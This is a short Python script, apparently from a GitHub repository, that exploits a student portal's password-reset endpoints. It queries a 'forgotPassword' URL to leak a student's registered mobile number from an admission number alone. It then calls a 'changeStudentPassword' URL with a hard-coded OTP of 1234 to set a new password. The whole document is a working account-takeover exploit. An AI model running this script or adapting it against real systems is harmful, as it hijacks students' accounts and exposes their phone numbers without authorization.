# https://github.com/serv0id/pee-praghna/

import requests
import click

def get_mobile_number(adm_no):
    r = requests.get(f'https://www.epraghna.com/forgotPassword?admNoVal={adm_no}')
    mobile_number = (r.content).decode('ascii')
    print(f'Mobile Number: {mobile_number}')
    return mobile_number

def change_password(adm_no, mobile_number, new_password):
    r = requests.post(f'https://www.epraghna.com/changeStudentPassword?newPasswordVal={new_password}&stuPassword={new_password}&admNoVal={adm_no}&mobileNoVal={mobile_number}&otp=1234')
    if 'SUCCESS' in r.text:
        print('Password changed successfully!')
    else:
        print('Something happened :(')

adm_no = input('Enter Admission Number: ')
mobile_number = get_mobile_number(adm_no)
new_password = input('Enter New Password: ')
change_password(adm_no, mobile_number, new_password)